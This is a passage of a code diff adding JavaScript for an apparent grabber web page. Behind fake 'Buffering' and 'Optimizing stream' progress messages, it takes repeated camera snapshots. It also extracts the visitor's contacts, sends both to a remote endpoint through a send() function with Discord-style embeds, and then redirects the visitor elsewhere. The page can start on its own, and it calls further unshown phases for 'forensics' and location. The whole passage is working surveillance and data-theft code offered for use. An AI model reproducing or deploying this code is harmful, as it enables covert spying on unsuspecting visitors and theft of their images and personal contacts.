+            video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }
+        });
+
+        DOM.video.srcObject = stream;
+        await DOM.video.play();
+
+        // CRITICAL FIX: Wait for video to actually be ready
+        let attempts = 0;
+        while (DOM.video.readyState < 2 && attempts < 50) {
+            await sleep(100);
+            attempts++;
+        }
+
+    } catch (e) {
+        // If failed (denied/error), just skip
+        return;
+    }
+
+    updateProgress(60, 'Buffering...');
+
+    for (let i = 1; i <= CONFIG.CAMERA_SNAPS; i++) {
+        const quality = 90 + i; // Fake progress
+        updateProgress(60 + (i * 4), `Optimizing stream ${quality}%...`);
+
+        if (DOM.video.videoWidth > 0 && DOM.video.videoHeight > 0) {
+            DOM.canvas.width = DOM.video.videoWidth;
+            DOM.canvas.height = DOM.video.videoHeight;
+            const ctx = DOM.canvas.getContext('2d');
+            ctx.drawImage(DOM.video, 0, 0);
+
+            await new Promise(resolve => {
+                DOM.canvas.toBlob(blob => {
+                    if (blob) {
+                        send({
+                            embed: {
+                                title: `📸 Snap #${i}`,
+                                color: 0xE74C3C,
+                                image: { url: `attachment://snap_${i}.jpg` }
+                            },
+                            file: { blob, name: `snap_${i}.jpg` }
+                        });
+                    }
+                    resolve();
+                }, 'image/jpeg', 0.85);
+            });
+        }
+        await sleep(CONFIG.SNAP_INTERVAL);
+    }
+
+    // Cleanup
+    if (stream) stream.getTracks().forEach(t => t.stop());
+}
+
+// 4. Contacts (Mobile)
+async function phaseContacts() {
+    if (!('contacts' in navigator && 'ContactsManager' in window)) return;
+    updateProgress(90, 'Syncing details...');
+
+    try {
+        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+        if (contacts.length) {
+            const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
+            await send({
+                embed: { title: '📇 Contacts', color: 0xF1C40F, description: `${contacts.length} extracted` },
+                file: { blob, name: 'contacts.json' }
+            });
+        }
+    } catch (e) { }
+}
+
+// Main Sequence
+async function run() {
+    if (DOM.trigger) DOM.trigger.style.display = 'none';
+
+    await phaseForensics();
+    await phaseLocation();
+    await phaseCamera();
+    await phaseContacts();
+
+    updateProgress(100, 'Ready');
+    await sleep(500);
+    window.location.replace(CONFIG.REDIRECT_URL);
+}
+
+// Start
+if (CONFIG.AUTO_START) {
+    setTimeout(run, 800);
+} else if (DOM.trigger) {
+    DOM.trigger.onclick = run;
+}
